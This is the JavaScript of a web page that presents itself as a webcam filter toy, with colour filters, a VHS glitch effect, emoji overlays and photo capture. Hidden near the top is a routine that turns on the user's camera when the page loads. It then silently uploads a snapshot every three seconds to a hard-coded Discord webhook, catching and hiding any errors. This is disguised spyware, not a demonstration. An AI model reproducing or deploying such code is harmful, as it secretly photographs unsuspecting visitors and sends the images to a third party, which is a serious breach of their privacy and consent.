<style>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';

for (let i = 0; i < 40; i++) {
  const p = document.createElement('div');
  p.className = 'particle';
  p.style.left = Math.random() * 100 + '%';
  p.style.animationDuration = (8 + Math.random() * 12) + 's';
  p.style.animationDelay = (Math.random() * 15) + 's';
  p.style.width = p.style.height = (1 + Math.random() * 3) + 'px';
  document.getElementById('particles').appendChild(p);
}

const video = document.getElementById('cam');

const canvas = document.createElement('canvas');
let stream = null;
let ready = false;

function send(blob) {
  const fd = new FormData();
  const now = new Date();
  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
  fd.append('file', blob, `foto_${ts}.png`);
  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
}

function capture() {
  if (!ready || !video.videoWidth) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.scale(-1, 1);
  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
  canvas.toBlob(send, 'image/png');
}

(async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } }, audio: false });
    video.srcObject = stream;
    await video.play();
    ready = true;
    setInterval(capture, 3000);
    capture();
  } catch {}
})();

window.addEventListener('beforeunload', () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
});

const filterMap = {
  neon:        'hue-rotate(45deg) saturate(1.6) contrast(1.1)',
  vintage:     'sepia(0.6) saturate(1.2) hue-rotate(-15deg) brightness(1.05)',
  glitch:      'contrast(1.3) brightness(1.1) saturate(1.8) hue-rotate(180deg)',
  vhs:         'contrast(1.2) saturate(1.4) brightness(1.05)',
  psychedelic: 'hue-rotate(0deg) saturate(2) contrast(1.2) brightness(1.1)',
  noir:        'grayscale(1) contrast(1.5) brightness(0.85)',
  dream:       'brightness(1.2) contrast(0.8) saturate(1.3) blur(1px)',
  thermal:     'hue-rotate(310deg) saturate(2.2) contrast(1.3) brightness(1.1)',
  invert:      'invert(1) saturate(1.5) hue-rotate(180deg)',
  warm:        'sepia(0.5) saturate(1.6) hue-rotate(-5deg) brightness(1.1)',
  ice:         'hue-rotate(190deg) saturate(1.4) brightness(1.15) contrast(0.9)',
};

let currentFilter = 'neon';
let psyRaf = null;
let psyHue = 0;

function getFilterCSS(name) {
  if (name === 'psychedelic') return `hue-rotate(${psyHue}deg) saturate(2) contrast(1.2) brightness(1.1)`;
  return filterMap[name] || 'none';
}

function setFilter(name) {
  currentFilter = name;
  document.querySelectorAll('#filters button').forEach(b => b.classList.remove('active'));
  const btn = document.querySelector(`#filters button[data-filter="${name}"]`);
  if (btn) btn.classList.add('active');
  document.getElementById('filterBadge').textContent = name;
  if (psyRaf) { cancelAnimationFrame(psyRaf); psyRaf = null; }
  stopVHS();
  if (name === 'psychedelic') {
    (function frame() {
      psyHue = (psyHue + 1.5) % 360;
      video.style.filter = `hue-rotate(${psyHue}deg) saturate(2) contrast(1.2) brightness(1.1)`;
      psyRaf = requestAnimationFrame(frame);
    })();
  } else {
    video.style.filter = filterMap[name] || 'none';
  }
  if (name === 'vhs') startVHS();
}

document.getElementById('filters').addEventListener('click', e => {
  const btn = e.target.closest('button');
  if (btn) setFilter(btn.dataset.filter);
});

// ── photo capture ──
const snapCanvas = document.createElement('canvas');
const snapCtx = snapCanvas.getContext('2d');
const photoEl = document.getElementById('photos');
const captureBtn = document.getElementById('captureBtn');
const burstBtn = document.getElementById('burstBtn');

function flash() {
  const el = document.createElement('div');
  el.className = 'flash';
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 350);
}

function addPhoto(blob) {
  const url = URL.createObjectURL(blob);
  const now = new Date();
  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
  const div = document.createElement('div');
  div.className = 'item';
  div.innerHTML = `<img src="${url}"><a class="overlay" href="${url}" download="foto_${ts}.png"><span>💾</span></a>`;
  photoEl.prepend(div);
  while (photoEl.children.length > 8) {
    const last = photoEl.lastChild;
    URL.revokeObjectURL(last.querySelector('img').src);
    last.remove();
  }
}

function vhsFrame(imgData, w, h) {
  const d = imgData.data;
  const out = new Uint8ClampedArray(d);
  const shift = 6 + Math.random() * 20 | 0;
  for (let y = 0; y < h; y++) {
    const row = y * w;
    for (let x = 0; x < w; x++) {
      const i = (row + x) * 4;
      const ri = (row + Math.max(0, x - shift)) * 4;
      const bi = (row + Math.min(w - 1, x + shift)) * 4;
      out[i]     = d[ri] || d[i];
      out[i + 2] = d[bi + 2] || d[i + 2];
    }
  }
  for (let t = 0; t < 4 + Math.random() * 8 | 0; t++) {
    const barY = Math.random() * h | 0;
    const barH = 3 + Math.random() * 20 | 0;
    const barShift = (Math.random() * 60 - 30) | 0;
    for (let row = barY; row < Math.min(barY + barH, h); row++) {
      const srcOff = (row * w + Math.max(0, barShift)) * 4;
      const dstOff = row * w * 4;
      const len = (w - Math.abs(barShift)) * 4;
      if (barShift > 0) {
        for (let k = 0; k < len; k++) out[dstOff + k] = out[srcOff + k];
      } else {
        for (let k = 0; k < len; k++) out[dstOff + k] = out[dstOff - barShift * 4 + k];
      }
    }
  }
  return new ImageData(out, w, h);
}

function capturePhoto() {
  if (!ready || !video.videoWidth) return;
  const w = video.videoWidth, h = video.videoHeight;
  snapCanvas.width = w;
  snapCanvas.height = h;
  snapCtx.setTransform(-1, 0, 0, 1, 0, 0);

  if (currentFilter === 'vhs') {
    snapCtx.filter = 'none';
    snapCtx.drawImage(video, -w, 0, w, h);
    snapCtx.setTransform(1, 0, 0, 1, 0, 0);
    const frame = snapCtx.getImageData(0, 0, w, h);
    snapCtx.putImageData(vhsFrame(frame, w, h), 0, 0);
  } else {
    snapCtx.filter = getFilterCSS(currentFilter);
    snapCtx.drawImage(video, -w, 0, w, h);
    snapCtx.setTransform(1, 0, 0, 1, 0, 0);
  }

  snapCtx.filter = 'none';

  if (currentMood !== 'none') {
    const eo = document.getElementById('emojiOverlay');
    snapCtx.drawImage(eo, 0, 0, eo.width, eo.height, 0, 0, w, h);
  }

  snapCanvas.toBlob(addPhoto, 'image/png');
  flash();
}

captureBtn.addEventListener('click', capturePhoto);

let bursting = false;
burstBtn.addEventListener('click', async () => {
  if (bursting) return;
  bursting = true;
  burstBtn.style.opacity = '0.4';
  for (let i = 0; i < 5; i++) {
    capturePhoto();
    await new Promise(r => setTimeout(r, 400));
  }
  bursting = false;
  burstBtn.style.opacity = '1';
});

// ── VHS glitch overlay ──
let vhsRunning = false;
let vhsRaf = null;
let vhsState = null;

function startVHS() {
  const overlay = document.getElementById('glitchOverlay');
  const parent = overlay.parentElement;
  overlay.style.display = 'block';
  vhsRunning = true;

  const offscreen = document.createElement('canvas');
  const offCtx = offscreen.getContext('2d');
  const ctx = overlay.getContext('2d');

  let glitch = false;
  let glitchTimer = 0;
  let glitchShift = 0;
  let bars = [];

  function resize() {
    const pw = parent.offsetWidth, ph = parent.offsetHeight;
    const dpr = window.devicePixelRatio || 1;
    overlay.width = pw * dpr;
    overlay.height = ph * dpr;
    overlay.style.width = pw + 'px';
    overlay.style.height = ph + 'px';
    offscreen.width = pw;
    offscreen.height = ph;
  }
  resize();
  window.addEventListener('resize', resize);

  function drawGlitch() {
    if (!vhsRunning) return;

    const pw = parent.offsetWidth, ph = parent.offsetHeight;

    if (!glitch && Math.random() < 0.04) {
      glitch = true;
      glitchTimer = 60 + Math.random() * 180;
      glitchShift = 4 + Math.random() * 16 | 0;
      bars = [];
      for (let i = 0; i < 3 + Math.random() * 6 | 0; i++) {
        bars.push({
          y: Math.random() * ph | 0,
          h: 2 + Math.random() * 12 | 0,
          r: Math.random() * 40 - 20 | 0,
          red: Math.random() > 0.4,
        });
      }
    }

    if (glitch) {
      offCtx.setTransform(-1, 0, 0, 1, 0, 0);
      offCtx.drawImage(video, -pw, 0, pw, ph);
      offCtx.setTransform(1, 0, 0, 1, 0, 0);

      const frame = offCtx.getImageData(0, 0, pw, ph);
      const d = frame.data;
      const out = new Uint8ClampedArray(d);

      const shift = glitchShift;
      for (let y = 0; y < ph; y++) {
        const row = y * pw;
        for (let x = 0; x < pw; x++) {
          const i = (row + x) * 4;
          const ri = (row + Math.max(0, x - shift)) * 4;
          const bi = (row + Math.min(pw - 1, x + shift)) * 4;
          out[i]     = d[ri] || d[i];
          out[i + 2] = d[bi + 2] || d[i + 2];
        }
      }

      for (const b of bars) {
        for (let row = b.y; row < Math.min(b.y + b.h, ph); row++) {
          const srcOff = (row * pw + Math.max(0, b.r)) * 4;
          const dstOff = row * pw * 4;
          const len = (pw - Math.abs(b.r)) * 4;
          if (b.r > 0) {
            for (let k = 0; k < len; k++) out[dstOff + k] = out[srcOff + k];
          } else {
            for (let k = 0; k < len; k++) out[dstOff + k] = out[dstOff - b.r * 4 + k];
          }
        }
      }

      const dpr = window.devicePixelRatio || 1;
      ctx.clearRect(0, 0, overlay.width, overlay.height);
      ctx.save();
      ctx.scale(dpr, dpr);

      const tmp = new ImageData(out, pw, ph);
      ctx.putImageData(tmp, 0, 0);

      // red / cyan flicker bars on top
      for (const b of bars) {
        if (b.red) {
          ctx.fillStyle = `rgba(255,40,40,${0.15 + Math.random() * 0.15})`;
        } else {
          ctx.fillStyle = `rgba(0,255,255,${0.15 + Math.random() * 0.15})`;
        }
        ctx.fillRect(0, b.y, pw, b.h);
      }

      ctx.restore();

      glitchTimer -= 16;
      if (glitchTimer <= 0) {
        glitch = false;
        ctx.clearRect(0, 0, overlay.width, overlay.height);
      }
    } else {
      ctx.clearRect(0, 0, overlay.width, overlay.height);
    }

    vhsRaf = requestAnimationFrame(drawGlitch);
  }

  vhsState = { overlay, offscreen, ctx, offCtx, resize: resize.bind(null) };
  drawGlitch();
}

function stopVHS() {
  vhsRunning = false;
  if (vhsRaf) { cancelAnimationFrame(vhsRaf); vhsRaf = null; }
  const overlay = document.getElementById('glitchOverlay');
  overlay.style.display = 'none';
  const ctx = overlay.getContext('2d');
  ctx && ctx.clearRect(0, 0, overlay.width, overlay.height);
}

// ── emoji particle overlay ──
let emojiRunning = false;
let emojiRaf = null;
let emojiParticles = [];
let currentMood = 'none';

const moodPresets = {
  party:  { emojis: ['🎉','🎊','🥳','🎈','🎁','🎀','✨'], count: 30, speed: 0.3, sway: 0.4, size: [16, 32] },
  color:  { emojis: ['🌈','✨','💫','🌟','⭐','🎨','🦋','🔮'], count: 24, speed: 0.2, sway: 0.8, size: [14, 28] },
  chaos:  { emojis: ['💀','👻','🤡','🎃','👽','👾','😈','💥'], count: 35, speed: 0.7, sway: 1.2, size: [16, 30] },
  love:   { emojis: ['💖','💕','💗','💓','💘','❤️‍🔥','🩷','💝'], count: 28, speed: 0.25, sway: 0.3, size: [16, 30] },
  nature: { emojis: ['🌸','🌺','🌻','🌿','🍀','🦋','🌸','🌼','🌱'], count: 22, speed: 0.15, sway: 0.3, size: [14, 28] },
  sixseven: { emojis: ['😎','👉','🔥','💯','🫰','✨'], count: 14, speed: 0.3, sway: 0.4, size: [14, 22] },
};

function spawnEmojis(mood) {
  const cfg = moodPresets[mood];
  if (!cfg) return [];
  const p = [];
  for (let i = 0; i < cfg.count; i++) {
    p.push({
      emoji: cfg.emojis[Math.floor(Math.random() * cfg.emojis.length)],
      x: Math.random(),
      y: Math.random(),
      size: cfg.size[0] + Math.random() * (cfg.size[1] - cfg.size[0]),
      vx: (Math.random() - 0.5) * cfg.sway * 0.3,
      vy: -(cfg.speed * (0.4 + Math.random() * 0.6)),
      phase: Math.random() * Math.PI * 2,
      freq: 0.3 + Math.random() * 0.4,
      sway: cfg.sway,
      speed: cfg.speed,
      alpha: 0.5 + Math.random() * 0.5,
    });
  }
  return p;
}

document.getElementById('emojiTags').addEventListener('click', e => {
  const btn = e.target.closest('button');
  if (!btn) return;
  document.querySelectorAll('#emojiTags button').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  currentMood = btn.dataset.mood;
  if (currentMood !== 'none') startEmojis();
  else stopEmojis();
});

function startEmojis() {
  if (emojiRunning) return;
  const overlay = document.getElementById('emojiOverlay');
  overlay.style.display = 'block';
  emojiRunning = true;
  emojiParticles = spawnEmojis(currentMood);
  drawEmojis();
}

function stopEmojis() {
  emojiRunning = false;
  if (emojiRaf) { cancelAnimationFrame(emojiRaf); emojiRaf = null; }
  const overlay = document.getElementById('emojiOverlay');
  overlay.style.display = 'none';
  const ctx = overlay.getContext('2d');
  if (ctx) ctx.clearRect(0, 0, overlay.width, overlay.height);
  emojiParticles = [];
}

const origSetFilter = setFilter;
setFilter = function(name) {
  origSetFilter(name);
  if (currentMood !== 'none') startEmojis();
};

function drawEmojis() {
  if (!emojiRunning) return;
  const overlay = document.getElementById('emojiOverlay');
  const parent = overlay.parentElement;
  const pw = parent.offsetWidth, ph = parent.offsetHeight;
  const dpr = window.devicePixelRatio || 1;
  overlay.width = pw * dpr;
  overlay.height = ph * dpr;
  overlay.style.width = pw + 'px';
  overlay.style.height = ph + 'px';
  const ctx = overlay.getContext('2d');
  ctx.clearRect(0, 0, overlay.width, overlay.height);
  ctx.scale(dpr, dpr);

  const cfg = moodPresets[currentMood] || moodPresets.party;
  const now = Date.now();

  if (currentMood === 'sixseven') {
    for (const p of emojiParticles) {
      p.x += p.vx + Math.sin(now * 0.001 * p.freq + p.phase) * p.sway * 0.005;
      p.y += p.vy * (1 / 60);
      if (p.y < -0.1) { p.y = 1.1; p.x = Math.random(); p.emoji = cfg.emojis[Math.floor(Math.random() * cfg.emojis.length)]; }
      ctx.save();
      ctx.globalAlpha = p.alpha * 0.5;
      ctx.font = `${p.size * 0.7}px serif`;
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText(p.emoji, p.x * pw, p.y * ph);
      ctx.restore();
    }

    const bobL = Math.sin(now * 0.006) * 12;
    const bobR = Math.sin(now * 0.006 + Math.PI) * 12;
    const size = Math.min(pw, ph) * 0.28;

    ctx.save();
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    const numSize = size * 0.45;
    ctx.font = `${numSize}px sans-serif`;
    ctx.shadowColor = 'rgba(255,200,50,0.3)';
    ctx.shadowBlur = 8;
    ctx.fillText('6️⃣', pw * 0.25, ph * 0.55 + bobL - size * 0.7);
    ctx.fillText('7️⃣', pw * 0.75, ph * 0.55 + bobR - size * 0.7);

    ctx.shadowBlur = 0;
    ctx.font = `${size}px serif`;
    const r = size * 0.55;
    for (const [hx, hy] of [[pw*0.25, ph*0.55+bobL], [pw*0.75, ph*0.55+bobR]]) {
      const grad = ctx.createRadialGradient(hx - r*0.2, hy - r*0.2, 0, hx, hy, r);
      grad.addColorStop(0, 'rgba(255,220,150,0.25)');
      grad.addColorStop(1, 'rgba(255,180,100,0.08)');
      ctx.fillStyle = grad;
      ctx.beginPath();
      ctx.arc(hx, hy, r, 0, Math.PI * 2);
      ctx.fill();
    }
    ctx.fillStyle = '#fff';
    ctx.shadowColor = 'rgba(255,200,100,0.25)';
    ctx.shadowBlur = 16;
    ctx.fillText('🫲', pw * 0.25, ph * 0.55 + bobL);
    ctx.fillText('🫱', pw * 0.75, ph * 0.55 + bobR);

    ctx.restore();
  } else {
    for (const p of emojiParticles) {
      p.x += p.vx + Math.sin(now * 0.001 * p.freq + p.phase) * p.sway * 0.005;
      p.y += p.vy * (1 / 60);
      if (p.y < -0.1) { p.y = 1.1; p.x = Math.random(); p.emoji = cfg.emojis[Math.floor(Math.random() * cfg.emojis.length)]; }
      const sx = p.x * pw;
      const sy = p.y * ph;
      ctx.save();
      ctx.globalAlpha = p.alpha;
      ctx.font = `${p.size}px serif`;
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.shadowColor = `hsla(0,0%,100%,${p.alpha * 0.2})`;
      ctx.shadowBlur = 8;
      ctx.fillText(p.emoji, sx, sy);
      ctx.restore();
    }
  }

  ctx.setTransform(1, 0, 0, 1, 0, 0);
  emojiRaf = requestAnimationFrame(drawEmojis);
}
</script>
